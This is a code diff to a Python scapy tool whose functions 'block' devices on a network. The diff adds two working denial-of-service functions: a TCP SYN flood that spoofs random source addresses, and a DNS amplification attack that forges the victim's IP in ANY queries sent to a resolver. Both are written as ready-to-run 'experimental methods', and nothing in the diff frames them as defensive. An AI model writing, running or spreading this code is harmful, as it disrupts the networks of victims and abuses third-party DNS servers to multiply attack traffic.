@@ -1,5 +1,5 @@
 import time
-from scapy.all import ARP, send, sendp, IP, ICMP, RandMAC
+from scapy.all import ARP, send, sendp, IP, ICMP, RandMAC, RandIP, RandShort
 
 def get_gateway_ip(network):
     """
@@ -110,3 +110,48 @@ def block_via_icmp_unreachable(target_ip, network, block_duration=60, interval=1
         time.sleep(interval)
     if log_callback:
         log_callback(f"Finished ICMP Unreachable on {target_ip}.")
+
+def block_via_tcp_syn_flood(target_ip, target_port=80, block_duration=60, interval=0.01, log_callback=None):
+    """
+    Experimental method: Floods the target with TCP SYN packets, potentially overwhelming its connection queue.
+    This is a more aggressive method that can be very effective but should be used with caution.
+    """
+    from scapy.all import IP, TCP, send
+    if log_callback:
+        log_callback(f"Starting TCP SYN Flood on {target_ip}:{target_port} for {block_duration} seconds!")
+    
+    end_time = time.time() + block_duration
+    count = 0
+    while time.time() < end_time:
+        # Create a packet with random source IP and port
+        pkt = IP(dst=target_ip, src=RandIP()) / TCP(dport=target_port, sport=RandShort(), flags="S")
+        send(pkt, verbose=False)
+        count += 1
+        if log_callback and count % 100 == 0:
+            log_callback(f"Sent {count} TCP SYN packets to {target_ip}:{target_port}")
+        time.sleep(interval)
+    if log_callback:
+        log_callback(f"Finished TCP SYN Flood on {target_ip}:{target_port}.")
+
+def block_via_dns_amplification(target_ip, dns_server, block_duration=60, interval=0.1, log_callback=None):
+    """
+    Experimental method: Uses DNS amplification attack by sending small DNS queries that generate large responses.
+    This method can be very effective but requires a vulnerable DNS server.
+    """
+    from scapy.all import IP, UDP, DNS, DNSQR, send
+    if log_callback:
+        log_callback(f"Starting DNS Amplification attack on {target_ip} using DNS server {dns_server}!")
+    
+    # Create a DNS query that will generate a large response
+    dns_query = IP(dst=dns_server, src=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
+    
+    end_time = time.time() + block_duration
+    count = 0
+    while time.time() < end_time:
+        send(dns_query, verbose=False)
+        count += 1
+        if log_callback and count % 10 == 0:
+            log_callback(f"Sent {count} DNS amplification queries")
+        time.sleep(interval)
+    if log_callback:
+        log_callback(f"Finished DNS Amplification attack on {target_ip}.")
